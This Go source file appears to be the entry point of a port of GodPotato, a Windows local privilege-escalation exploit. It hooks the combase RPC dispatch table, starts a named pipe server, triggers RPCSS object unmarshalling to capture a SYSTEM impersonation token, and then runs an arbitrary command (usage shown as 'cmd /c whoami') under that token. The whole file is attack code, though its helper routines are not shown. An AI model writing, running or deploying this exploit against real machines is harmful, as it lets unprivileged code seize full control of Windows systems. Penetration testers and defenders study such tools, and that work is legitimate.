package main

import (
	"os"
	"runtime"
	"strings"
	"time"
)

func parseCommandLine() string {
	for i := 1; i < len(os.Args); i++ {
		arg := os.Args[i]
		switch {
		case arg == "-debug":
			*debugMode = true
		case arg == "-cmd" && i+1 < len(os.Args):
			return os.Args[i+1]
		case strings.HasPrefix(arg, "-cmd="):
			return arg[len("-cmd="):]
		case arg == "-h" || arg == "--help":
			return ""
		}
	}
	if len(os.Args) > 1 && !strings.HasPrefix(os.Args[1], "-") {
		return strings.Join(os.Args[1:], " ")
	}
	return ""
}

func main() {
	cmd := parseCommandLine()
	if cmd == "" {
		logInfo(`usage: godpotato.exe -cmd "cmd /c whoami"`)
		logInfo(`       godpotato.exe cmd /c whoami`)
		os.Exit(1)
	}

	// COM apartments are per-OS-thread. Pin the main goroutine so
	// CoInitializeEx / CoCreateInstance / CoUnmarshalInterface all run on the
	// thread that owns the apartment.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	coInitialize()
	defer coUninitialize()

	ctx := NewGodPotatoContext()
	if !ctx.initialized() {
		logInfo("[!] GodPotato context not initialized")
		os.Exit(1)
	}

	logInfo("[*] CombaseModule: 0x%x", ctx.CombaseModule)
	logInfo("[*] DispatchTable: 0x%x", ctx.DispatchTablePtr)
	logInfo("[*] UseProtseqFunction: 0x%x", ctx.UseProtseqFunctionPtr)
	logInfo("[*] UseProtseqFunctionParamCount: %d", ctx.UseProtseqParamCount)

	logInfo("[*] HookRPC")
	ctx.HookRPC()

	logInfo("[*] Start PipeServer")
	if !ctx.Start() {
		logInfo("[!] Cannot start the pipe server")
		ctx.Restore()
		os.Exit(1)
	}

	logInfo("[*] Trigger RPCSS")
	trigger := NewGodPotatoUnmarshalTrigger(ctx)
	hr := trigger.Trigger()
	logInfo("[*] UnmarshalObject: 0x%x", uint32(hr))

	token := ctx.WaitToken(10 * time.Second)
	if token != 0 {
		if name, ok := tokenUserName(token); ok {
			logInfo("[*] CurrentUser: %s", name)
		}
		createProcessReadOut(token, cmd)
		closeHandle(uintptr(token))
	} else {
		logInfo("[!] Failed to impersonate security context token")
	}

	ctx.Restore()
	ctx.Stop()
	logInfo("[*] Exit")
}
